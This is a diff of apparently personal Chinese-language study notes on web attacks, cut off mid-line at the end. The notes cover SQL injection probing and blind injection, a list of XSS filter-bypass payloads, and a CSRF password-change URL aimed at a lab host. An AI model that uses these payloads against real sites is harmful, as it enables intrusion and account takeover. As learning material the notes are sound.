@@ -8,7 +8,7 @@
 
 
 ## SQL注入
-### 判断sql注入
+### 判断能否sql注入
 * 提交单引号 ```id=1'```
 * and大法和or大法 
 ```
@@ -21,10 +21,31 @@ id=1+1
 ```
 ### 数据库权限判断
 
+### 猜字段个数
+* 在注入点后面加order by x
 
-### GET注入和POST注入
-* 注入方式不同，get使用url参数提交注入语言，post通过表格提交
 
 ### 显错注入和盲注
-*  显错注入，主要是利用了联合查询union select
-*  盲注，使用and来盲猜数据库名，表名
+*  显错注入，即带回显错误提示，主要是利用了联合查询union select
+*  盲注，没有任何信息返回，一般可以利用时间sleep()来判断查询成功与否，使用and来盲猜数据库名，表名
+
+
+## XSS
+### 绕过方法
+```
+<script>alert("test")</script>
+
+<img src="javascript:alert('XSS')">
+
+<img src="#" onerror=alert(/跨站/)></img>
+
+<img src="javascript:alert(/xss/)">
+
+<iframe/onload=alert(/insight-labs/)>
+
+<div style=”width:expression(alert('xsser'))″>xsser</div>
+```
+
+### CSRF(cross site request forgery)
+* 直接生成包含url参数的欺骗链接，如在任何未验证的情况下修改用户密码：http://10.1.1.174/vulnerabilities/csrf/**?password_new=123&password_conf=123&Change=Change#**
+* r
